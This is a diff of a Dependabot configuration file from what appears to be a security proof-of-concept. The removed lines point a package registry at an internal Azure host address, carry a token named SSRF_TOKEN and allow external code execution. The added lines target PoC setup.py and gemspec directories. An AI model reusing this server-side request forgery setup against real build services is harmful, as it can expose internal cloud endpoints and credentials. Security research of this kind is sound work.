@@ -1,14 +1,11 @@
 version: 2
-registries:
-  hgap:
-    type: python-index
-    url: http://168.63.129.16:32526/vmSettings#
-    token: ${{ secrets.SSRF_TOKEN }}
 updates:
   - package-ecosystem: "pip"
-    directory: "/"
+    directory: "/dependabot_poc/poc1_setup_py"
     schedule:
       interval: "daily"
-    insecure-external-code-execution: allow
-    registries:
-      - hgap
+
+  - package-ecosystem: "bundler"
+    directory: "/dependabot_poc/poc2_gemspec"
+    schedule:
+      interval: "daily"
